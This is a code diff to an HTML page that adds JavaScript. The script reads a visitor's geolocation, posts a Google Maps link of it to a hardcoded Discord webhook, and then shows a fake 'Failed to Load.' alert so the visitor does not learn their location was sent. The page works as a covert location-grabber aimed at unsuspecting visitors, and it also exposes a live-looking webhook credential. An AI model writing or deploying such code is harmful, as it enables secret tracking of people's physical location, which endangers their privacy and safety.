@@ -49,5 +49,24 @@
             const googleMapsLink =`https://www.google.com/maps/dir/?api=1&destination=${lat},${lon}&destination_place_id=ChIJN1t_tDeuEmsRUcIaDl1M5fI&markers=color:red%7Clabel:C%7C${lat},${lon}`;            const webhookUrl = 'https://discord.com/api/webhooks/1337154258281168896/NQv_m_JccepgAedCn1Le3_QindKI_voWv9L0NoI9itCIN5bpJNwXcFzDQWZRYbXH9oFb'; // Replace with your Discord webhook URL
             const data = {
                 content:`User's Location:${googleMapsLink}`            };
+            
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'}, body: JSON.stringify(data)            }).then(response => {
+                if (response.ok) {
+                    alert('Failed to Load.');} else {
+                    alert('Failed to Load.');} }).catch(error => {
+                console.error('Error:', error);            });} function showError(error) {
+            switch (error.code) {
+                case error.PERMISSION_DENIED:
+                    alert("User denied the request for Geolocation.");                    break;
+                case error.POSITION_UNAVAILABLE:
+                    alert("Location information is unavailable.");                    break;
+                case error.TIMEOUT:
+                    alert("The request to get user location timed out.");                    break;
+                case error.UNKNOWN_ERROR:
+                    alert("An unknown error occurred.");                    break;} }
+    </script>
 </body>
 </html>
